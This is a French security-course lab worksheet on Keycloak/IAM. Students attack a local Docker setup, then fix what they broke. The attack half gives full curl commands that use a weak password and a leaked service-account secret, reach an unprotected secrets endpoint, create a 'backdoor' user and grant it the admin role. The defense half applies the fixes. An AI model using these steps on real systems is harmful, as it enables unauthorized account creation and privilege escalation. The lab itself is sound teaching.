# TP — Sécurisation des accès aux ressources Cloud
## "Comment on vole une identité Cloud"

**Durée :** 2h  
**Mode :** Individuel  
**Environnement :** GitHub Codespaces

---

## Mise en contexte

Vous arrivez chez CorpCloud en tant qu'auditeur de sécurité.  
L'entreprise vous donne accès à son environnement IAM pour évaluation.  
Votre mission : trouver les failles, les exploiter, puis les corriger.

Deux temps :
- **Partie 1 (1h) — Attaque :** vous jouez l'attaquant
- **Partie 2 (1h) — Défense :** vous corrigez ce que vous avez cassé

---

## Démarrage de l'environnement

```bash
docker compose -f compose-iam-tp.yml up -d
```

Attendez 30 secondes puis vérifiez :

```bash
docker ps
```

Vous devez voir 3 conteneurs : `corpcloud-iam`, `corpcloud-api`, `attacker`.

Accès Keycloak (console admin) : http://localhost:8080  
Login admin : `admin` / `admin`

---

# PARTIE 1 — ATTAQUE

> Vous ne connaissez qu'une chose : l'URL du serveur IAM.  
> Objectif : devenir administrateur.

---

## Étape 1 — Énumération

```bash
curl http://localhost:8080/realms/corpcloud/.well-known/openid-configuration
```

**Question 1 :** Quels endpoints sont exposés publiquement ?

```bash
curl http://localhost:8080/realms/corpcloud/protocol/openid-connect/certs
```

**Question 2 :** Que contient cette réponse ? À quoi servent ces clés ?

---

## Étape 2 — Accès initial

```bash
curl -s -X POST http://localhost:8080/realms/corpcloud/protocol/openid-connect/token \
  -d "client_id=corpcloud-app" \
  -d "username=stagiaire" \
  -d "password=stagiaire123" \
  -d "grant_type=password" | python3 -m json.tool
```

**Question 3 :** Copiez la valeur `access_token`.

```bash
echo "VOTRE_ACCESS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

**Question 4 :** Quels rôles sont assignés à ce compte ?

---

## Étape 3 — Exploration de l'API

```bash
TOKEN="VOTRE_ACCESS_TOKEN"

curl http://localhost:5000/api/public

curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/profile

curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/secrets
```

**Question 5 :** Que retourne `/api/secrets` ? Quelle vulnérabilité permet cet accès ?

---

## Étape 4 — Persistance

```bash
curl -s -X POST http://localhost:8080/realms/corpcloud/protocol/openid-connect/token \
  -d "client_id=corpcloud-app" \
  -d "username=svc-account" \
  -d "password=svc-acc-secret-XkP92mQz" \
  -d "grant_type=password" | python3 -m json.tool
```

```bash
SVC_TOKEN="TOKEN_DU_COMPTE_DE_SERVICE"

curl -s -X POST "http://localhost:8080/admin/realms/corpcloud/users" \
  -H "Authorization: Bearer $SVC_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "backdoor",
    "email": "backdoor@corpcloud.io",
    "enabled": true,
    "credentials": [{"type":"password","value":"Backdoor2024!","temporary":false}]
  }'
```

**Question 6 :** Vérifiez dans la console Keycloak que `backdoor` a été créé.

---

## Étape 5 — Élévation de privilège

```bash
curl -s "http://localhost:8080/admin/realms/corpcloud/users?username=backdoor" \
  -H "Authorization: Bearer $SVC_TOKEN" | python3 -m json.tool
```

```bash
BACKDOOR_ID="ID_RECUPERE_CI_DESSUS"

curl -s "http://localhost:8080/admin/realms/corpcloud/roles/admin" \
  -H "Authorization: Bearer $SVC_TOKEN" | python3 -m json.tool
```

```bash
ROLE_ID="ID_DU_ROLE_ADMIN"

curl -s -X POST "http://localhost:8080/admin/realms/corpcloud/users/$BACKDOOR_ID/role-mappings/realm" \
  -H "Authorization: Bearer $SVC_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[{\"id\":\"$ROLE_ID\",\"name\":\"admin\"}]"
```

**Question 7 :** Connectez-vous avec `backdoor` / `Backdoor2024!`. Que pouvez-vous faire ?

---

## Bilan de l'attaque

| Étape | Vulnérabilité exploitée | Impact |
|---|---|---|
| Accès initial | | |
| Exploration API | | |
| Persistance | | |
| Élévation de privilège | | |

---

# PARTIE 2 — DÉFENSE

---

## Correction 1 — Politique de mot de passe

Keycloak → Realm Settings → Security Defenses → Password Policy.

Ajoutez : longueur minimum 12, 1 majuscule, 1 chiffre, 1 caractère spécial.

**Question 8 :** Retentez `stagiaire` / `stagiaire123`. Que se passe-t-il ?

---

## Correction 2 — Principe du moindre privilège

Keycloak → Users → stagiaire → Role Mappings.

Retirez le rôle `developer`. Il ne doit avoir que `readonly`.

**Question 9 :** Quels endpoints sont encore accessibles après correction ?

---

## Correction 3 — Sécuriser l'endpoint API

Ouvrez `api/app.py`. Corrigez `/api/secrets` pour n'autoriser que le rôle `admin`.

```python
# Indice : le token décodé contient realm_access.roles
```

```bash
docker compose -f compose-iam-tp.yml restart api
```

**Question 10 :** Testez avec le token du stagiaire puis avec alice.

---

## Correction 4 — Nettoyage

Dans la console Keycloak :
- Supprimez l'utilisateur `backdoor`
- Changez le mot de passe de `svc-account`
- Retirez les attributs sensibles du profil de `bob`

---

## Bilan final

**Question 11 :**

| Vulnérabilité | Correction appliquée | Concept IAM derrière |
|---|---|---|
| Mot de passe faible | | |
| Trop de droits sur stagiaire | | |
| Endpoint sans contrôle de rôle | | |
| Secret exposé dans les attributs | | |
| Compte de service surpuissant | | |

---

## Pour aller plus loin

- Qu'est-ce qu'un token JWT et pourquoi est-il signé ?
- Quelle différence entre authentification et autorisation ?
- Qu'est-ce qu'un STS ? Quel rôle a joué Keycloak ici ?
- Comment Azure AD / Entra ID implémente ces mêmes concepts en production ?
